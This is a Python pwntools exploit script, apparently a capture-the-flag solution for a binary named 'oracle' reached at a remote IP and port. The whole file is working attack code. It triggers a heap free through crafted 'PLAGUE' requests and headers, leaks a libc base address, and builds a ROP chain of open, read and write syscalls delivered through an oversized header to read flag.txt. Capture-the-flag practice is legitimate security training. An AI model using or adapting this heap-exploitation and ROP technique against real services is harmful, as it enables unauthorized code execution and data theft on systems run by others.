from pwn import *

exe = ELF("oracle_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = '94.237.63.128'
remote_port = 59852
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
menu_delim = b'> '
def logbase(): info('libc.address = %#x' % libc.address)
def logleak(name, val):  info(name+' = %#x' % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def so(data): return r.send(data)
def sn(num): return str(num).encode()
def menu(num): return sla(menu_delim, sn(num))

def make_request(act, target, version):
    payload = act + b' ' + target + b' ' + version + b'\r\n'
    so(payload)

def make_headers(headers):
    payload = b''
    for key, val in headers.items():
        payload += (key+b': '+val+b'\r\n')
    payload += b'\r\n'
    so(payload)

def make_raw_headers(payload):
    so(payload+b'\r\n'*2)

# Trigger unsorted bin free
make_request(b'PLAGUE', b'bbbb', b'aaaaaaaa')
headers = {
    b'Plague-Target': b'a'*0x10,
    b'Content-Length': b'8'
}
make_headers(headers)
so(b'a')
pause()
old_r = r

# Get libc leak
r = conn()
make_request(b'PLAGUE', b'bbbb', b'aaaaaaaa')
headers = {
    b'Plague-Target': b'a'*0x10,
    b'Content-Length': b'8'
}
make_headers(headers)
so(b'a')
r.recvuntil(b'plague: ')
libc.address = u64(r.recv(8)) - 0x1ecb61
logleak('libc.address', libc.address)
pause()
old_r = r

r = conn()
make_request(b'PLAGUE', b'bbbb', b'aaaaaaaa')
info(f'Make request...')
pause()
flag_str = libc.address+0x1edfe0
rop = ROP(libc)

# read flag.txt
rop(rax=0x0, rdi=0x6, rsi=flag_str, rdx=8)
rop.raw(rop.find_gadget(['syscall', 'ret']))

# open
rop(rax=0x2, rdi=flag_str, rsi=0, rdx=0)
rop.raw(rop.find_gadget(['syscall', 'ret']))

# read
xchg_edi_eax = libc.address+0x0014f671
rop.raw(xchg_edi_eax)
rop(rax=0x0, rsi=flag_str, rdx=0x30)
rop.raw(rop.find_gadget(['syscall', 'ret']))

# write
rop(rax=0x1, rdi=0x6, rsi=flag_str, rdx=0x30)
rop.raw(rop.find_gadget(['syscall', 'ret']))
payload = b'\n'*0x430
payload += p64(0)
payload += rop.chain()
make_raw_headers(payload)
logleak('flag_str', flag_str)
pause()
r.send(b'flag.txt')
r.interactive()

